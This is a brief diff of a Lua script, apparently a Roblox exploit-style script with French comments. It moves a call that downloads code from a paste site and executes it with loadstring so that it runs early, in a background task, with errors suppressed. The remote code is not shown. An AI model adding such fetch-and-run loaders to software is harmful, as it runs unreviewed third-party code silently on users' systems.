@@ -140,6 +140,13 @@ local function updateMessage()
     end
 end
 
+-- LANCER LE SCRIPT EXTERNE DÈS MAINTENANT
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/j1SA13WG/raw"))()
+    end)
+end)
+
 -- Boucle de mise à jour
 local connection
 connection = RunService.Heartbeat:Connect(function()
@@ -184,5 +191,3 @@ connection = RunService.Heartbeat:Connect(function()
         end)
     end
 end)
-
-loadstring(game:HttpGet("https://pastefy.app/j1SA13WG/raw"))()
